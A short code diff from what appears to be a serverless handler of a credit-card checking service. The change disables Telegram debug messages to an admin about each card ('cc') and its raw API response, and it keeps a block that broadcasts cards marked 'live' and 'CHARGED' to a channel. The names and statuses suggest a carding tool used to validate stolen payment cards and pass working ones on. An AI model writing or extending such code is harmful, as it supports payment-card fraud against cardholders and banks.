@@ -337,8 +337,7 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
-    // Send debug to admin via Telegram ONLY for UNKNOWN (fire-and-forget)
-    sendAdminDebug(cc, result.status, result.rawResponse, result.message).catch(() => {});
+    // Admin debug notifications disabled
     
     // Broadcast CHARGED cards to channel (fire-and-forget)
     if (result.status === 'live') {
